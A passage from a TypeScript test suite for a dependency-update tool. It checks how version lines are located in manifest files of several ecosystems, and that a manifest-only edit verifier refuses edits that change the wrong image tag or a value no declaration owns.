      "other==2.0.0\nacme-lib==1.4.0\n",
      "acme-lib",
      "==1.4.0",
      2
    ],
    [
      "oci/Dockerfile — anchors",
      "oci" as const,
      "Dockerfile",
      "FROM alpine:3.18\n",
      "alpine",
      "3.18",
      1
    ],
    [
      "npm — NO anchor: parsePackageJson reports no line at all",
      "npm" as const,
      "package.json",
      '{\n  "dependencies": {\n    "@acme/lib": "^1.2.3"\n  }\n}\n',
      "@acme/lib",
      "^1.2.3",
      undefined
    ],
    [
      "python/pyproject.toml — NO anchor: same reason as npm",
      "python" as const,
      "pyproject.toml",
      '[project]\nname = "app"\ndependencies = ["requests==2.31.0"]\n',
      "requests",
      "==2.31.0",
      undefined
    ]
    // `maven` is the sixth row and has its own case above, because its reason is step 4 (a line IS
    // reported, and it is the wrong one) rather than steps 3–4 finding no line.
  ])("%s", (_name, ecosystem, manifestPath, content, coordinate, fromVersion, expectedLine) => {
    const anchor = locateVersionLine(content, {
      ecosystem,
      manifestPath,
      coordinate,
      fromVersion
    });
    expect(anchor?.line).toBe(expectedLine);
    if (expectedLine === undefined) return;
    // AND THE PROPERTY THAT MAKES ANCHORING THEM HARMLESS: the anchor line names the coordinate
    // too, so it is a candidate of the coordinate rule and clause (c) can only agree with the
    // selection the unanchored rule would have made. An ecosystem where this failed would be one
    // the anchor could silently redirect.
    expect(anchor?.text).toContain(coordinate);
    expect(coordinateRuleCandidates(content.split("\n"), { coordinate, fromVersion })).toEqual([
      expectedLine - 1
    ]);
  });

  it("declines when the inventory's declared version is not what the file says (a stale row)", () => {
    expect(locateVersionLine(VALUES, { ...VALUES_SPEC, fromVersion: "9.9.9" })).toBeUndefined();
  });

  it("declines when the file declares the same image at two versions — ambiguous by coordinate", () => {
    const two = "a:\n  image: acme/api:1.2.3\nb:\n  image: acme/api:1.2.3\n";
    // The parser MERGES these into one entry (one inventory row), so there is no single edit site:
    // editing one line would leave the other behind. Refused at derivation, which costs no container.
    expect(locateVersionLine(two, VALUES_SPEC)).toBeUndefined();
  });

  it("MUTATION GUARD on the merge case: the fixture really does merge into ONE entry", () => {
    // Without this the assertion above is satisfied by a parse that returned TWO entries and tripped
    // the "exactly one candidate" clause instead — a green test for the wrong reason, and step 5
    // could then be deleted unnoticed.
    const two = "a:\n  image: acme/api:1.2.3\nb:\n  image: acme/api:1.2.3\n";
    const parsed = manifestParserFor("oci", "chart/values.yaml")(two);
    expect(parsed).toHaveLength(1);
    expect(parsed[0]?.occurrences).toBe(2);
  });

  it("NEVER THROWS: a lockfile path, an unlisted basename and unparseable bytes all yield undefined", () => {
    // The derivation runs BEFORE the gate that refuses these properly. If it threw, a missing anchor
    // would become a failure mode of its own and `verifyManifestOnlyEdit` would never get to say why.
    expect(
      locateVersionLine("x", { ...VALUES_SPEC, manifestPath: "pnpm-lock.yaml" })
    ).toBeUndefined();
    expect(
      locateVersionLine("x", { ...VALUES_SPEC, manifestPath: "chart/notes.txt" })
    ).toBeUndefined();
    expect(locateVersionLine("\t- [", VALUES_SPEC)).toBeUndefined();
    // ...and the gate still refuses the lockfile, loudly, so nothing was softened.
    expectRefusal(() => manifestParserFor("oci", "pnpm-lock.yaml"), "lockfile");
  });
});

describe("verifyManifestOnlyEdit catches a WRONG SELECTION in a split-shape values file", () => {
  const paths = ["chart/values.yaml"];

  it("mints a proof for the correctly-anchored split-shape bump", () => {
    const edited = VALUES.replace("    tag: 1.2.3\nworker:", "    tag: 1.2.4\nworker:");
    const proof = verifyManifestOnlyEdit({
      repo: "acme/widget",
      headBranch: "scp/dep-bump/c1",
      path: "chart/values.yaml",
      declaredManifestPaths: paths,
      ecosystem: "oci",
      baseContent: VALUES,
      newContent: edited,
      coordinate: "acme/api"
    });
    expect(proof).toMatchObject({
      coordinate: "acme/api",
      fromDeclared: "1.2.3",
      toDeclared: "1.2.4"
    });
  });

  it("REFUSES when the OTHER image's tag moved — gate 6 is independent of the anchor derivation", () => {
    // This is the guarantee `split-shape-image-bumps.md` §4 rests on. Suppose the anchor picked the
    // wrong declaration's line: the runner edits it, and this verifier — asking a DIFFERENT question
    // (which parsed declaration's version moved?) of DIFFERENT bytes (the AFTER file) — refuses
    // before the HMAC proof is minted, and there is no way to write without that proof.
    const edited = VALUES.replace("    tag: 1.2.3\nappVersion", "    tag: 1.2.4\nappVersion");
    expect(edited).not.toBe(VALUES);
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          repo: "acme/widget",
          headBranch: "scp/dep-bump/c1",
          path: "chart/values.yaml",
          declaredManifestPaths: paths,
          ecosystem: "oci",
          baseContent: VALUES,
          newContent: edited,
          coordinate: "acme/api"
        }),
      "coordinate_not_expected"
    );
  });

  it("REFUSES a values.yaml edit that changes something no declaration owns", () => {
    const edited = VALUES.replace("appVersion: 1.2.3", "appVersion: 9.9.9");
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          repo: "acme/widget",
          headBranch: "scp/dep-bump/c1",
          path: "chart/values.yaml",
          declaredManifestPaths: paths,
          ecosystem: "oci",
          baseContent: VALUES,
          newContent: edited,
          coordinate: "acme/api"
        }),
      "no_version_changed"
    );
  });
});
